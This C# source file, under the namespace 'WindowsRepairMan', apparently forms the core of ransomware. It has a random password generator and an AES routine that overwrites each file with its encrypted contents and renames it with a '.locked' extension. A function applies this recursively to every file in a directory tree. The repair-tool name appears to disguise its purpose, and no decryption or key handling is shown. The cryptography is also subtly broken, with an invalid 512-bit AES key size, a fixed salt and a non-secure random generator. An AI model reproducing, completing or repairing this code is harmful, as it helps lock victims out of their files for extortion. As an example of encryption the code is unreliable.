using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace WindowsRepairMan
{
    public class Utils
    {
        public string CreatePassword(int length)
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder builder = new StringBuilder();
            Random rand = new Random();
            for (int i = 0; i < length; i++)
            {
                builder.Append(validChars[rand.Next(validChars.Length)]);
            }
            return builder.ToString();
        }
        public byte[] Encrypt(byte[] plainBytes, byte[] passphraseBytes)
        {
            byte[] encryptedBytes = null;
            byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (AesManaged aes = new AesManaged())
                {
                    aes.KeySize = 512;
                    aes.BlockSize = aes.LegalBlockSizes.Max().MaxSize;

                    var key = new Rfc2898DeriveBytes(passphraseBytes, salt, 1000);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);
                    aes.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(plainBytes, 0, plainBytes.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public void EncryptFile(string filename, string password)
        {
            byte[] fileContents = File.ReadAllBytes(filename);
            byte[] passBytes = Encoding.UTF8.GetBytes(password);
            passBytes = SHA512Cng.Create().ComputeHash(passBytes);
            byte[] encryptedBytes = Encrypt(fileContents, passBytes);

            File.WriteAllBytes(filename, encryptedBytes);
            System.IO.File.Move(filename, filename + ".locked");
        }

        public void EncryptDirectory(string location, string passphrase)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirs = Directory.GetDirectories(location);
            foreach(string file in files)
            {
                EncryptFile(file, passphrase);
            }
            foreach(string dir in childDirs)
            {
                EncryptDirectory(dir, passphrase);
            }
        }
    }
}
